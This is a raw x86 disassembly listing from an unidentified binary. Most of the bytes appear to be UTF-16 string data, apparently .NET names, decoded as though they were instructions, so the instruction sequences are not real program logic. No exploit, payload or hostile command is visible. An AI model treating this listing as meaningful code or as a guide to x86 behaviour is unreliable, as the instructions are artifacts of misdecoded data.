  404ce5:	add    al,BYTE PTR [eax]
  404ce7:	add    BYTE PTR [edi+eax*1],dl
  404cea:	add    BYTE PTR [eax],al
  404cec:	xor    BYTE PTR [edx],cl
  404cee:	add    BYTE PTR [eax],al
  404cf0:	push   0x2
  404cf2:	add    BYTE PTR [eax],al
  404cf4:	xlat   BYTE PTR ds:[ebx]
  404cf5:	or     al,BYTE PTR [eax]
  404cf7:	add    ah,al
  404cf9:	add    eax,DWORD PTR [eax]
  404cfb:	add    ah,dh
  404cfd:	or     al,BYTE PTR [eax]
  404cff:	add    ah,al
  404d01:	or     al,BYTE PTR [eax]
  404d03:	add    BYTE PTR [ebp+0x2],bl
  404d06:	add    BYTE PTR [eax],al
  404d08:	jb     0x404d0b
  404d0a:	add    BYTE PTR [eax],al
  404d0c:	jmp    0x404d1b
  404d0e:	add    BYTE PTR [eax],al
  404d10:	push   ss
  404d11:	inc    ecx
  404d12:	add    BYTE PTR [ebx+0x0],al
  404d15:	dec    esp
  404d16:	add    BYTE PTR [edi+0x0],cl
  404d19:	outs   dx,BYTE PTR ds:[esi]
  404d1a:	add    BYTE PTR [edi+0x0],cl
  404d1d:	bound  eax,QWORD PTR [eax]
  404d1f:	push   0x0
  404d21:	add    BYTE PTR gs:[ebx+0x0],ah
  404d25:	je     0x404d27
  404d27:	add    BYTE PTR [eax],al
  404d29:	add    BYTE PTR [eax],al
  404d2b:	adc    al,BYTE PTR [ecx+0x0]
  404d2e:	dec    ebp
  404d2f:	add    BYTE PTR [ebp+0x0],ah
  404d32:	ins    DWORD PTR es:[edi],dx
  404d33:	add    BYTE PTR [edx+0x0],ah
  404d36:	add    BYTE PTR gs:[edx+0x0],dh
  404d3a:	dec    edi
  404d3b:	add    BYTE PTR [esi+0x0],ah
  404d3e:	add    BYTE PTR es:[eax],al
  404d41:	add    BYTE PTR [eax],dh
  404d43:	inc    ecx
  404d44:	add    BYTE PTR [eax+eax*1+0x64],ah
  404d48:	add    BYTE PTR [ecx+0x0],ch
  404d4b:	outs   dx,BYTE PTR ds:[esi]
  404d4c:	add    BYTE PTR [edi+0x0],ah
  404d4f:	inc    ecx
  404d50:	add    BYTE PTR [ebx+0x0],ah
  404d53:	arpl   WORD PTR [eax],ax
  404d55:	add    BYTE PTR gs:[ebx+0x0],dh
  404d59:	jae    0x404d5b
  404d5b:	inc    ebx
  404d5c:	add    BYTE PTR [edi+0x0],ch
  404d5f:	outs   dx,BYTE PTR ds:[esi]
  404d60:	add    BYTE PTR [eax+eax*1+0x72],dh
  404d64:	add    BYTE PTR [edi+0x0],ch
  404d67:	ins    BYTE PTR es:[edi],dx
  404d68:	add    BYTE PTR [ebp+0x0],al
  404d6b:	outs   dx,BYTE PTR ds:[esi]
  404d6c:	add    BYTE PTR [eax+eax*1+0x72],dh
  404d70:	add    BYTE PTR [ecx+0x0],bh
  404d73:	cmp    BYTE PTR [eax],al
  404d75:	add    BYTE PTR [eax],al
  404d77:	es inc ecx
  404d79:	add    BYTE PTR [eax+eax*1+0x64],ah
  404d7d:	add    BYTE PTR [ecx+0x0],ch
  404d80:	outs   dx,BYTE PTR ds:[esi]
  404d81:	add    BYTE PTR [edi+0x0],ah
  404d84:	dec    ebp
  404d85:	add    BYTE PTR [ebp+0x0],ah
  404d88:	ins    DWORD PTR es:[edi],dx
  404d89:	add    BYTE PTR [edx+0x0],ah
  404d8c:	add    BYTE PTR gs:[edx+0x0],dh
  404d90:	push   esp
  404d91:	add    BYTE PTR [edi+0x0],ch
  404d94:	inc    edi
  404d95:	add    BYTE PTR [edx+0x0],dh
  404d98:	outs   dx,DWORD PTR ds:[esi]
  404d99:	add    BYTE PTR [ebp+0x0],dh
  404d9c:	jo     0x404d9e
  404d9e:	pop    esp
  404d9f:	add    BYTE PTR [eax],al
  404da1:	add    BYTE PTR [ebx+eax*2],dh
  404da4:	add    BYTE PTR [ecx+0x0],ah
  404da7:	jo     0x404da9
  404da9:	imul   eax,DWORD PTR [eax],0x610074
  404daf:	ins    BYTE PTR es:[edi],dx
  404db0:	add    BYTE PTR [eax+eax*1+0x46],dl
  404db4:	add    BYTE PTR [ebx+0x0],dl
  404db7:	inc    ecx
  404db8:	add    BYTE PTR [eax+0x0],dh
  404dbb:	jo     0x404dbd
  404dbd:	ins    BYTE PTR es:[edi],dx
  404dbe:	add    BYTE PTR [ecx+0x0],ch
  404dc1:	arpl   WORD PTR [eax],ax
  404dc3:	popa   
  404dc4:	add    BYTE PTR [eax+eax*1+0x69],dh
  404dc8:	add    BYTE PTR [edi+0x0],ch
  404dcb:	outs   dx,BYTE PTR ds:[esi]
  404dcc:	add    BYTE PTR [edi+0x0],al
  404dcf:	jb     0x404dd1
  404dd1:	outs   dx,DWORD PTR ds:[esi]
  404dd2:	add    BYTE PTR [ebp+0x0],dh
  404dd5:	jo     0x404dd7
  404dd7:	jb     0x404dd9
  404dd9:	add    BYTE PTR [eax],al
  404ddb:	inc    esi
  404ddc:	inc    ebx
  404ddd:	add    BYTE PTR [eax+0x0],ch
  404de0:	popa   
  404de1:	add    BYTE PTR [esi+0x0],ch
  404de4:	add    BYTE PTR [bx+di+0x0],ch
  404de8:	outs   dx,BYTE PTR ds:[esi]
  404de9:	add    BYTE PTR [edi+0x0],ah
  404dec:	inc    ecx
  404ded:	add    BYTE PTR [eax+0x0],dh
  404df0:	jo     0x404df2
  404df2:	ins    BYTE PTR es:[edi],dx
  404df3:	add    BYTE PTR [ecx+0x0],ch
  404df6:	arpl   WORD PTR [eax],ax
  404df8:	popa   
  404df9:	add    BYTE PTR [eax+eax*1+0x69],dh
  404dfd:	add    BYTE PTR [edi+0x0],ch
  404e00:	outs   dx,BYTE PTR ds:[esi]
  404e01:	add    BYTE PTR [edi+0x0],al
  404e04:	jb     0x404e06
  404e06:	outs   dx,DWORD PTR ds:[esi]
  404e07:	add    BYTE PTR [ebp+0x0],dh
  404e0a:	jo     0x404e0c
  404e0c:	inc    esp
  404e0d:	add    BYTE PTR [ebp+0x0],ah
  404e10:	jae    0x404e12
  404e12:	arpl   WORD PTR [eax],ax
  404e14:	jb     0x404e16
  404e16:	imul   eax,DWORD PTR [eax],0x740070
  404e1c:	imul   eax,DWORD PTR [eax],0x6e006f
  404e22:	pushf  
  404e23:	add    BYTE PTR [eax],al
  404e25:	add    BYTE PTR [esi],ch
  404e27:	inc    ebx
  404e28:	add    BYTE PTR [eax+0x0],ch
  404e2b:	add    BYTE PTR gs:[ebx+0x0],ah
  404e2f:	imul   eax,DWORD PTR [eax],0x69
  404e32:	add    BYTE PTR [esi+0x0],ch
  404e35:	add    BYTE PTR [bx+0x0],al
  404e39:	jb     0x404e3b
  404e3b:	outs   dx,DWORD PTR ds:[esi]
  404e3c:	add    BYTE PTR [ebp+0x0],dh
  404e3f:	jo     0x404e41
  404e41:	dec    ebp
  404e42:	add    BYTE PTR [ebp+0x0],ah
  404e45:	ins    DWORD PTR es:[edi],dx
  404e46:	add    BYTE PTR [edx+0x0],ah
  404e49:	add    BYTE PTR gs:[edx+0x0],dh
  404e4d:	jae    0x404e4f
  404e4f:	push   0x70006900
  404e54:	add    dl,dl
  404e56:	add    BYTE PTR [eax],al
  404e58:	add    BYTE PTR [ebx+eax*2],ah
  404e5b:	add    BYTE PTR [edi+0x0],ch
  404e5e:	jo     0x404e60
  404e60:	jns    0x404e62
  404e62:	jb     0x404e64
  404e64:	imul   eax,DWORD PTR [eax],0x680067
  404e6a:	je     0x404e6c
  404e6c:	push   ebx
  404e6d:	add    BYTE PTR [eax+eax*1+0x61],dh
  404e71:	add    BYTE PTR [eax+eax*1+0x65],dh
  404e75:	add    BYTE PTR [ebp+0x0],ch
  404e78:	add    BYTE PTR gs:[esi+0x0],ch
  404e7c:	je     0x404e7e
  404e7e:	lock add BYTE PTR [eax],al
  404e81:	add    BYTE PTR [ebx+eax*2],bh
  404e84:	add    BYTE PTR [edx+0x0],dh
  404e87:	add    BYTE PTR gs:[ecx+0x0],ah
  404e8b:	je     0x404e8d
  404e8d:	imul   eax,DWORD PTR [eax],0x67006e
  404e93:	inc    edi
  404e94:	add    BYTE PTR [eax+eax*1+0x6f],ch
  404e98:	add    BYTE PTR [edx+0x0],ah
  404e9b:	popa   
  404e9c:	add    BYTE PTR [eax+eax*1+0x41],ch
  404ea0:	add    BYTE PTR [eax+0x0],dh
  404ea3:	jo     0x404ea5
  404ea5:	ins    BYTE PTR es:[edi],dx
  404ea6:	add    BYTE PTR [ecx+0x0],ch
  404ea9:	arpl   WORD PTR [eax],ax
  404eab:	popa   
  404eac:	add    BYTE PTR [eax+eax*1+0x69],dh
  404eb0:	add    BYTE PTR [edi+0x0],ch
  404eb3:	outs   dx,BYTE PTR ds:[esi]
  404eb4:	add    BYTE PTR [edi+0x0],al
  404eb7:	jb     0x404eb9
  404eb9:	outs   dx,DWORD PTR ds:[esi]
  404eba:	add    BYTE PTR [ebp+0x0],dh
  404ebd:	jo     0x404ebf
  404ebf:	jo     0x404ec2
  404ec1:	add    BYTE PTR [eax],al
  404ec3:	cmp    al,BYTE PTR [ebx+0x0]
  404ec6:	jb     0x404ec8
  404ec8:	add    BYTE PTR gs:[ecx+0x0],ah
  404ecc:	je     0x404ece
  404ece:	imul   eax,DWORD PTR [eax],0x67006e
  404ed4:	dec    esp
  404ed5:	add    BYTE PTR [edi+0x0],ch
  404ed8:	arpl   WORD PTR [eax],ax
  404eda:	popa   
  404edb:	add    BYTE PTR [eax+eax*1+0x41],ch
  404edf:	add    BYTE PTR [eax+0x0],dh
  404ee2:	jo     0x404ee4
  404ee4:	ins    BYTE PTR es:[edi],dx
  404ee5:	add    BYTE PTR [ecx+0x0],ch
  404ee8:	arpl   WORD PTR [eax],ax
  404eea:	popa   
  404eeb:	add    BYTE PTR [eax+eax*1+0x69],dh
  404eef:	add    BYTE PTR [edi+0x0],ch
  404ef2:	outs   dx,BYTE PTR ds:[esi]
  404ef3:	add    BYTE PTR [edi+0x0],al
  404ef6:	jb     0x404ef8
  404ef8:	outs   dx,DWORD PTR ds:[esi]
  404ef9:	add    BYTE PTR [ebp+0x0],dh
  404efc:	jo     0x404efe
  404efe:	mov    ds:0x30000001,al
  404f03:	inc    esp
  404f04:	add    BYTE PTR [ebp+0x0],ah
  404f07:	ins    BYTE PTR es:[edi],dx
  404f08:	add    BYTE PTR [ebp+0x0],ah
  404f0b:	je     0x404f0d
  404f0d:	imul   eax,DWORD PTR [eax],0x67006e
  404f13:	inc    ecx
  404f14:	add    BYTE PTR [eax+0x0],dh
  404f17:	jo     0x404f19
  404f19:	ins    BYTE PTR es:[edi],dx
  404f1a:	add    BYTE PTR [ecx+0x0],ch
  404f1d:	arpl   WORD PTR [eax],ax
  404f1f:	popa   
  404f20:	add    BYTE PTR [eax+eax*1+0x69],dh
  404f24:	add    BYTE PTR [edi+0x0],ch
  404f27:	outs   dx,BYTE PTR ds:[esi]
  404f28:	add    BYTE PTR [edi+0x0],al
  404f2b:	jb     0x404f2d
  404f2d:	outs   dx,DWORD PTR ds:[esi]
  404f2e:	add    BYTE PTR [ebp+0x0],dh
  404f31:	jo     0x404f33
  404f33:	aad    0x1
  404f35:	add    BYTE PTR [eax],al
  404f37:	push   ss
  404f38:	inc    esp
  404f39:	add    BYTE PTR [ebp+0x0],ah
  404f3c:	jae    0x404f3e
  404f3e:	arpl   WORD PTR [eax],ax
  404f40:	jb     0x404f42
  404f42:	imul   eax,DWORD PTR [eax],0x740070
  404f48:	imul   eax,DWORD PTR [eax],0x6e006f
  404f4e:	clc    
  404f4f:	add    DWORD PTR [eax],eax
  404f51:	add    BYTE PTR [esi],dl
  404f53:	inc    esp
  404f54:	add    BYTE PTR [ecx+0x0],ch
  404f57:	jae    0x404f59
  404f59:	jo     0x404f5b
  404f5b:	ins    BYTE PTR es:[edi],dx
  404f5c:	add    BYTE PTR [ecx+0x0],ah
  404f5f:	jns    0x404f61
  404f61:	dec    esi
  404f62:	add    BYTE PTR [ecx+0x0],ah
  404f65:	ins    DWORD PTR es:[edi],dx
  404f66:	add    BYTE PTR [ebp+0x0],ah
  404f69:	or     DWORD PTR [edx],eax
  404f6b:	add    BYTE PTR [eax],al
  404f6d:	or     BYTE PTR [eax+eax*1+0x6f],al
  404f71:	add    BYTE PTR [esi+0x0],ch
  404f74:	add    BYTE PTR gs:[edx],bl
  404f77:	add    al,BYTE PTR [eax]
  404f79:	add    BYTE PTR [edx],ch
  404f7b:	inc    ebp
  404f7c:	add    BYTE PTR [ebp+0x0],ch
  404f7f:	jo     0x404f81
  404f81:	je     0x404f83
  404f83:	jns    0x404f85
  404f85:	inc    ebx
  404f86:	add    BYTE PTR [edi+0x0],ch
  404f89:	ins    DWORD PTR es:[edi],dx
  404f8a:	add    BYTE PTR [ebp+0x0],ch
  404f8d:	popa   
  404f8e:	add    BYTE PTR [esi+0x0],ch
  404f91:	add    BYTE PTR fs:[eax+0x0],dl
  404f95:	popa   
  404f96:	add    BYTE PTR [edx+0x0],dh
  404f99:	popa   
  404f9a:	add    BYTE PTR [ebp+0x0],ch
  404f9d:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  404fa2:	add    BYTE PTR [edx+0x0],dh
  404fa5:	and    DWORD PTR [edx],eax
  404fa7:	add    BYTE PTR [eax],al
  404fa9:	xor    al,BYTE PTR [ebp+0x0]
  404fac:	ins    DWORD PTR es:[edi],dx
  404fad:	add    BYTE PTR [eax+0x0],dh
  404fb0:	je     0x404fb2
  404fb2:	jns    0x404fb4
  404fb4:	inc    ebx
  404fb5:	add    BYTE PTR [edi+0x0],ch
  404fb8:	ins    DWORD PTR es:[edi],dx
  404fb9:	add    BYTE PTR [ebp+0x0],ch
  404fbc:	popa   
  404fbd:	add    BYTE PTR [esi+0x0],ch
  404fc0:	add    BYTE PTR fs:[ebx+0x0],dl
  404fc4:	ja     0x404fc6
  404fc6:	imul   eax,DWORD PTR [eax],0x630074
  404fcc:	push   0x67004900
  404fd1:	add    BYTE PTR [esi+0x0],ch
  404fd4:	outs   dx,DWORD PTR ds:[esi]
  404fd5:	add    BYTE PTR [edx+0x0],dh
  404fd8:	add    BYTE PTR gs:[eax+eax*1+0x4d],ah
  404fdd:	add    al,BYTE PTR [eax]
  404fdf:	add    BYTE PTR [esi+0x45],al
  404fe2:	add    BYTE PTR [ebp+0x0],ch
  404fe5:	jo     0x404fe7
  404fe7:	je     0x404fe9
  404fe9:	jns    0x404feb
  404feb:	inc    ebx
  404fec:	add    BYTE PTR [edi+0x0],ch
  404fef:	ins    DWORD PTR es:[edi],dx
  404ff0:	add    BYTE PTR [ebp+0x0],ch
  404ff3:	popa   
  404ff4:	add    BYTE PTR [esi+0x0],ch
  404ff7:	add    BYTE PTR fs:[ebx+0x0],dl
  404ffb:	ja     0x404ffd
  404ffd:	imul   eax,DWORD PTR [eax],0x630074
  405003:	push   0x69005700
  405008:	add    BYTE PTR [eax+eax*1+0x68],dh
  40500c:	add    BYTE PTR [eax+eax*1+0x6f],al
  405010:	add    BYTE PTR [ebp+0x0],ch
  405013:	popa   
  405014:	add    BYTE PTR [ecx+0x0],ch
  405017:	outs   dx,BYTE PTR ds:[esi]
  405018:	add    BYTE PTR [ecx+0x0],cl
  40501b:	add    BYTE PTR [bp+0x0],ch
  40501f:	outs   dx,DWORD PTR ds:[esi]
  405020:	add    BYTE PTR [edx+0x0],dh
  405023:	add    BYTE PTR gs:[eax+eax*1+0x77],ah
  405028:	add    al,BYTE PTR [eax]
  40502a:	add    BYTE PTR [edx],bl
  40502c:	inc    ebp
  40502d:	add    BYTE PTR [ebp+0x0],ch
  405030:	jo     0x405032
  405032:	je     0x405034
  405034:	jns    0x405036
  405036:	push   ebx
  405037:	add    BYTE PTR [edi+0x0],dh
  40503a:	imul   eax,DWORD PTR [eax],0x630074
  405040:	push   0x73006500
  405045:	add    BYTE PTR [ebp+0xa000002],dh
  40504b:	inc    ebp
  40504c:	add    BYTE PTR [edx+0x0],dh
  40504f:	jb     0x405051
  405051:	outs   dx,DWORD PTR ds:[esi]
  405052:	add    BYTE PTR [edx+0x0],dh
  405055:	in     al,0x2
  405057:	add    BYTE PTR [eax],al
  405059:	or     al,0x47
  40505b:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40505f:	add    BYTE PTR [edx+0x0],ah
  405062:	popa   
  405063:	add    BYTE PTR [eax+eax*1-0x13],ch
  405067:	add    al,BYTE PTR [eax]
  405069:	add    BYTE PTR [edx],dl
  40506b:	inc    edi
  40506c:	add    BYTE PTR [edx+0x0],dh
  40506f:	outs   dx,DWORD PTR ds:[esi]
  405070:	add    BYTE PTR [ebp+0x0],dh
  405073:	jo     0x405075
  405075:	push   esp
  405076:	add    BYTE PTR [ecx+0x0],bh
  405079:	jo     0x40507b
  40507b:	gs add bl,bh
  40507e:	add    al,BYTE PTR [eax]
  405080:	add    BYTE PTR [eax],bl
  405082:	dec    eax
  405083:	add    BYTE PTR [ebp+0x0],ah
  405086:	ins    BYTE PTR es:[edi],dx
  405087:	add    BYTE PTR [eax+0x0],dh
  40508a:	inc    ebx
  40508b:	add    BYTE PTR [edi+0x0],ch
  40508e:	ins    DWORD PTR es:[edi],dx
  40508f:	add    BYTE PTR [ebp+0x0],ch
  405092:	popa   
  405093:	add    BYTE PTR [esi+0x0],ch
  405096:	add    BYTE PTR fs:[ebx+0x0],dh
  40509a:	or     al,0x3
  40509c:	add    BYTE PTR [eax],al
  40509e:	adc    al,0x48
  4050a0:	add    BYTE PTR [ebp+0x0],ah
  4050a3:	ins    BYTE PTR es:[edi],dx
  4050a4:	add    BYTE PTR [eax+0x0],dh
  4050a7:	inc    esp
  4050a8:	add    BYTE PTR [edi+0x0],ch
  4050ab:	ins    DWORD PTR es:[edi],dx
  4050ac:	add    BYTE PTR [ecx+0x0],ah
  4050af:	imul   eax,DWORD PTR [eax],0xf84006e
  4050b5:	add    BYTE PTR [eax],al
  4050b7:	sbb    BYTE PTR [eax+0x0],cl
  4050ba:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4050bf:	add    BYTE PTR [ecx+0x0],cl
  4050c2:	add    BYTE PTR fs:[ebp+0x0],ah
  4050c6:	outs   dx,BYTE PTR ds:[esi]
  4050c7:	add    BYTE PTR [eax+eax*1+0x69],dh
  4050cb:	add    BYTE PTR [eax+eax*1+0x79],dh
  4050cf:	add    bh,bh
  4050d1:	adc    DWORD PTR [eax],eax
  4050d3:	add    BYTE PTR [eax],bl
  4050d5:	dec    eax
  4050d6:	add    BYTE PTR [ebp+0x0],ah
  4050d9:	ins    BYTE PTR es:[edi],dx
  4050da:	add    BYTE PTR [eax+0x0],dh
  4050dd:	push   ebx
  4050de:	add    BYTE PTR [ebp+0x0],ah
  4050e1:	arpl   WORD PTR [eax],ax
  4050e3:	jne    0x4050e5
  4050e5:	jb     0x4050e7
  4050e7:	imul   eax,DWORD PTR [eax],0x790074
  4050ed:	jo     0x405107
  4050ef:	add    BYTE PTR [eax],al
  4050f1:	adc    cl,BYTE PTR [eax+0x0]
  4050f4:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4050f9:	add    BYTE PTR [eax+eax*1+0x79],dl
  4050fd:	add    BYTE PTR [eax+0x0],dh
  405100:	add    BYTE PTR gs:[ebx+0x0],dh
  405104:	fistp  WORD PTR [eax+eax*1]
  405107:	add    BYTE PTR [eax],dh
  405109:	dec    ecx
  40510a:	add    BYTE PTR [eax+eax*1+0x65],ah
  40510e:	add    BYTE PTR [esi+0x0],ch
  405111:	je     0x405113
  405113:	imul   eax,DWORD PTR [eax],0x790074
  405119:	inc    ebx
  40511a:	add    BYTE PTR [ecx+0x0],ah
  40511d:	outs   dx,BYTE PTR ds:[esi]
  40511e:	add    BYTE PTR [esi+0x0],ch
  405121:	outs   dx,DWORD PTR ds:[esi]
  405122:	add    BYTE PTR [eax+eax*1+0x42],dh
  405126:	add    BYTE PTR [ebp+0x0],ah
  405129:	push   edx
  40512a:	add    BYTE PTR [ebp+0x0],ah
  40512d:	jae    0x40512f
  40512f:	outs   dx,DWORD PTR ds:[esi]
  405130:	add    BYTE PTR [eax+eax*1+0x76],ch
  405134:	add    BYTE PTR [ebp+0x0],ah
  405137:	add    BYTE PTR fs:[edx+0x1f],ch
  40513b:	add    BYTE PTR [eax],al
  40513d:	sbb    BYTE PTR [ecx+0x0],cl
  405140:	add    BYTE PTR fs:[ebp+0x0],ah
  405144:	outs   dx,BYTE PTR ds:[esi]
  405145:	add    BYTE PTR [eax+eax*1+0x69],dh
  405149:	add    BYTE PTR [eax+eax*1+0x79],dh
  40514d:	add    BYTE PTR [eax+eax*1+0x79],dl
  405151:	add    BYTE PTR [eax+0x0],dh
  405154:	add    BYTE PTR gs:[edi+ebx*1+0x493c0000],cl
  40515c:	add    BYTE PTR [esi+0x0],ch
  40515f:	jae    0x405161
  405161:	jne    0x405163
  405163:	data16 add BYTE PTR [esi+0x0],ah
  405167:	imul   eax,DWORD PTR [eax],0x690063
  40516d:	add    BYTE PTR gs:[esi+0x0],ch
  405171:	je     0x405173
  405173:	dec    esi
  405174:	add    BYTE PTR [ebp+0x0],dh
  405177:	ins    DWORD PTR es:[edi],dx
  405178:	add    BYTE PTR [edx+0x0],ah
  40517b:	add    BYTE PTR gs:[edx+0x0],dh
  40517f:	dec    edi
  405180:	add    BYTE PTR [esi+0x0],ah
  405183:	push   eax
  405184:	add    BYTE PTR [ecx+0x0],ah
  405187:	jb     0x405189
  405189:	popa   
  40518a:	add    BYTE PTR [ebp+0x0],ch
  40518d:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  405192:	add    BYTE PTR [edx+0x0],dh
  405195:	jae    0x405197
  405197:	popf   
  405198:	pop    ds
  405199:	add    BYTE PTR [eax],al
  40519b:	push   cs
  40519c:	dec    ecx
  40519d:	add    BYTE PTR [esi+0x0],ch
  4051a0:	jbe    0x4051a2
  4051a2:	popa   
  4051a3:	add    BYTE PTR [eax+eax*1+0x69],ch
  4051a7:	add    BYTE PTR [eax+eax*1-0x3f],ah
  4051ab:	pop    ds
  4051ac:	add    BYTE PTR [eax],al
  4051ae:	cmp    cl,BYTE PTR [ecx+0x0]
  4051b1:	outs   dx,BYTE PTR ds:[esi]
  4051b2:	add    BYTE PTR [esi+0x0],dh
  4051b5:	popa   
  4051b6:	add    BYTE PTR [eax+eax*1+0x69],ch
  4051ba:	add    BYTE PTR [eax+eax*1+0x41],ah
  4051be:	add    BYTE PTR [ebx+0x0],ah
  4051c1:	arpl   WORD PTR [eax],ax
  4051c3:	add    BYTE PTR gs:[ebx+0x0],dh
  4051c7:	jae    0x4051c9
  4051c9:	inc    ebx
  4051ca:	add    BYTE PTR [edi+0x0],ch
  4051cd:	outs   dx,BYTE PTR ds:[esi]
  4051ce:	add    BYTE PTR [eax+eax*1+0x72],dh
  4051d2:	add    BYTE PTR [edi+0x0],ch
  4051d5:	ins    BYTE PTR es:[edi],dx
  4051d6:	add    BYTE PTR [ebp+0x0],al
  4051d9:	js     0x4051db
  4051db:	arpl   WORD PTR [eax],ax
  4051dd:	add    BYTE PTR gs:[eax+0x0],dh
  4051e1:	je     0x4051e3
  4051e3:	imul   eax,DWORD PTR [eax],0x6e006f
  4051e9:	iret   
  4051ea:	pop    ds
  4051eb:	add    BYTE PTR [eax],al
  4051ed:	sbb    cl,BYTE PTR [ecx+0x0]
  4051f0:	outs   dx,BYTE PTR ds:[esi]
  4051f1:	add    BYTE PTR [esi+0x0],dh
  4051f4:	popa   
  4051f5:	add    BYTE PTR [eax+eax*1+0x69],ch
  4051f9:	add    BYTE PTR [eax+eax*1+0x41],ah
  4051fd:	add    BYTE PTR [ebx+0x0],ah
  405200:	je     0x405202
  405202:	imul   eax,DWORD PTR [eax],0x6e006f
  405208:	call   FWORD PTR [edi]
  40520a:	add    BYTE PTR [eax],al
  40520c:	ss dec ecx
  40520e:	add    BYTE PTR [esi+0x0],ch
  405211:	jbe    0x405213
  405213:	popa   
  405214:	add    BYTE PTR [eax+eax*1+0x69],ch
  405218:	add    BYTE PTR [eax+eax*1+0x43],ah
  40521c:	add    BYTE PTR [edi+0x0],ch
  40521f:	ins    DWORD PTR es:[edi],dx
  405220:	add    BYTE PTR [ebp+0x0],ch
  405223:	popa   
  405224:	add    BYTE PTR [esi+0x0],ch
  405227:	add    BYTE PTR fs:[ebx+0x0],dl
  40522b:	ja     0x40522d
  40522d:	imul   eax,DWORD PTR [eax],0x630074
  405233:	push   0x67004900
  405238:	add    BYTE PTR [esi+0x0],ch
  40523b:	outs   dx,DWORD PTR ds:[esi]
  40523c:	add    BYTE PTR [edx+0x0],dh
  40523f:	add    BYTE PTR gs:[eax+eax*1+0x3a],ah
  405244:	and    BYTE PTR [eax],al
  405246:	add    BYTE PTR [esi],bl
  405248:	dec    ecx
  405249:	add    BYTE PTR [esi+0x0],ch
  40524c:	jbe    0x40524e
  40524e:	popa   
  40524f:	add    BYTE PTR [eax+eax*1+0x69],ch
  405253:	add    BYTE PTR [eax+eax*1+0x4e],ah
  405257:	add    BYTE PTR [edi+0x0],ch
  40525a:	push   ebx
  40525b:	add    BYTE PTR [ebp+0x0],ah
  40525e:	jb     0x405260
  405260:	jbe    0x405262
  405262:	add    BYTE PTR gs:[edx+0x0],dh
  405266:	outs   dx,BYTE PTR ds:[esi]
  405267:	and    BYTE PTR [eax],al
  405269:	add    BYTE PTR [esi],ch
  40526b:	dec    ecx
  40526c:	add    BYTE PTR [esi+0x0],ch
  40526f:	jbe    0x405271
  405271:	popa   
  405272:	add    BYTE PTR [eax+eax*1+0x69],ch
  405276:	add    BYTE PTR [eax+eax*1+0x52],ah
  40527a:	add    BYTE PTR [ebp+0x0],ah
  40527d:	je     0x40527f
  40527f:	jne    0x405281
  405281:	jb     0x405283
  405283:	outs   dx,BYTE PTR ds:[esi]
  405284:	add    BYTE PTR [ebp+0x0],ah
  405287:	add    BYTE PTR fs:[ecx+0x0],cl
  40528b:	add    BYTE PTR fs:[ebp+0x0],ah
  40528f:	outs   dx,BYTE PTR ds:[esi]
  405290:	add    BYTE PTR [eax+eax*1+0x69],dh
  405294:	add    BYTE PTR [eax+eax*1+0x79],dh
  405298:	add    BYTE PTR [edi+0x2c000020],cl
  40529e:	dec    ecx
  40529f:	add    BYTE PTR [esi+0x0],ch
  4052a2:	jbe    0x4052a4
  4052a4:	popa   
  4052a5:	add    BYTE PTR [eax+eax*1+0x69],ch
  4052a9:	add    BYTE PTR [eax+eax*1+0x53],ah
  4052ad:	add    BYTE PTR [edi+0x0],dh
  4052b0:	imul   eax,DWORD PTR [eax],0x630074
  4052b6:	push   0x73006500
  4052bb:	add    BYTE PTR [ecx+0x0],cl
  4052be:	add    BYTE PTR [bp+0x0],ch
  4052c2:	outs   dx,DWORD PTR ds:[esi]
  4052c3:	add    BYTE PTR [edx+0x0],dh
  4052c6:	add    BYTE PTR gs:[eax+eax*1-0x49],ah
  4052cb:	and    BYTE PTR [eax],al
  4052cd:	add    BYTE PTR [ecx+ecx*2],al
  4052d0:	add    BYTE PTR [ebx+0x0],dh
  4052d3:	lock and BYTE PTR [eax],al
  4052d6:	add    BYTE PTR [edx],cl
  4052d8:	dec    ecx
  4052d9:	add    BYTE PTR [ebx+0x0],dh
  4052dc:	dec    esi
  4052dd:	add    BYTE PTR [edi+0x0],ch
  4052e0:	je     0x4052e2
  4052e2:	mul    BYTE PTR [eax]
  4052e4:	add    BYTE PTR [eax],al
  4052e6:	sbb    al,0x4c
  4052e8:	add    BYTE PTR [ebp+0x0],ah
  4052eb:	add    BYTE PTR [bx+di+0x0],ah
  4052ef:	ins    BYTE PTR es:[edi],dx
  4052f0:	add    BYTE PTR [ebx+0x0],dl
  4052f3:	je     0x4052f5
  4052f5:	popa   
  4052f6:	add    BYTE PTR [eax+eax*1+0x65],dh
  4052fa:	add    BYTE PTR [ebp+0x0],ch
  4052fd:	add    BYTE PTR gs:[esi+0x0],ch
  405301:	je     0x405303
  405303:	add    BYTE PTR [ecx],ah
  405305:	add    BYTE PTR [eax],al
  405307:	adc    cl,BYTE PTR [eax+eax*1+0x6f]
  40530b:	add    BYTE PTR [edi+0x0],ah
  40530e:	outs   dx,DWORD PTR ds:[esi]
  40530f:	add    BYTE PTR [esi+0x0],ch
  405312:	dec    esi
  405313:	add    BYTE PTR [ecx+0x0],ah
  405316:	ins    DWORD PTR es:[edi],dx
  405317:	add    BYTE PTR [ebp+0x0],ah
  40531a:	xor    DWORD PTR [edx],esp
  40531c:	add    BYTE PTR [eax],al
  40531e:	push   ss
  40531f:	dec    ebp
  405320:	add    BYTE PTR [ecx+0x0],ah
  405323:	imul   eax,DWORD PTR [eax],0x41006c
  405329:	add    BYTE PTR fs:[eax+eax*1+0x72],ah
  40532e:	add    BYTE PTR [ebp+0x0],ah
  405331:	jae    0x405333
  405333:	jae    0x405335
  405335:	inc    edx
  405336:	and    al,BYTE PTR [eax]
  405338:	add    BYTE PTR [eax],dl
  40533a:	dec    ebp
  40533b:	add    BYTE PTR [ebp+0x0],ah
  40533e:	ins    DWORD PTR es:[edi],dx
  40533f:	add    BYTE PTR [edx+0x0],ah
  405342:	add    BYTE PTR gs:[edx+0x0],dh
  405346:	dec    edi
  405347:	add    BYTE PTR [esi+0x0],ah
  40534a:	push   ebx
  40534b:	and    al,BYTE PTR [eax]
  40534d:	add    BYTE PTR [esi],cl
  40534f:	dec    ebp
  405350:	add    BYTE PTR [ebp+0x0],ah
  405353:	ins    DWORD PTR es:[edi],dx
  405354:	add    BYTE PTR [edx+0x0],ah
  405357:	add    BYTE PTR gs:[edx+0x0],dh
  40535b:	jae    0x40535d
  40535d:	ins    BYTE PTR es:[edi],dx
  40535e:	and    al,BYTE PTR [eax]
  405360:	add    BYTE PTR [esi+ecx*2],ah
